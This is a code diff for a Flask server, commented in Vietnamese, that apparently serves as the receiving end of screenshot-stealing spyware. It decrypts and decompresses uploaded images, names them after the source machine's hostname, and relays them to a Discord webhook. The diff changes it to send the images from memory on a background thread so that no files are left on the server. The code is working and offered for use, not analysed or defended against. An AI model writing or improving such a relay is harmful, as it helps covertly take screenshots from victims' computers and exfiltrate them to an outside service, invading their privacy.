@@ -7,6 +7,8 @@ from datetime import datetime
 import requests
 from cryptography.fernet import Fernet
 from dotenv import load_dotenv
+import threading
+import io
 
 # Load biến môi trường (Discord webhook, secret key)
 load_dotenv()
@@ -15,10 +17,9 @@ DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
 FERNET_KEY = os.getenv("FERNET_KEY")  # Khóa Fernet 32-byte base64
 
 app = Flask(__name__)
-SAVE_FOLDER = "received"
-os.makedirs(SAVE_FOLDER, exist_ok=True)
 
 fernet = Fernet(FERNET_KEY)
+session = requests.Session()  # Tái sử dụng TCP connection
 
 
 def decrypt_and_decompress(data_base64: str) -> bytes:
@@ -27,19 +28,19 @@ def decrypt_and_decompress(data_base64: str) -> bytes:
     return zlib.decompress(decrypted)
 
 
-def send_to_discord(filename, filepath):
-    if not os.path.exists(filepath):
-        print(f"[!] File không tồn tại: {filepath}")
-        return
-
-    with open(filepath, "rb") as f:
-        files = {"file": (filename, f, "image/png")}
+def send_to_discord_memory_async(filename, img_bytes):
+    def task():
+        files = {"file": (filename, io.BytesIO(img_bytes), "image/png")}
         data = {"content": f"📷 Ảnh mới nhận: `{filename}`"}
         try:
-            res = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files)
+            res = session.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=5)
             print(f"[Discord] Status: {res.status_code}")
         except Exception as e:
             print(f"[!] Lỗi gửi Discord: {e}")
+
+    thread = threading.Thread(target=task)
+    thread.daemon = True
+    thread.start()
 
 
 @app.route("/", methods=["GET"])
@@ -57,12 +58,9 @@ def upload():
         img_data = decrypt_and_decompress(image_enc)
 
         filename = f"{sys_info['hostname']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
-        path = os.path.join(SAVE_FOLDER, filename)
 
-        with open(path, "wb") as f:
-            f.write(img_data)
-
-        send_to_discord(filename, path)
+        # Gửi file lên Discord bất đồng bộ, không lưu file
+        send_to_discord_memory_async(filename, img_data)
 
         return jsonify({"status": "success", "filename": filename})
     except Exception as e:
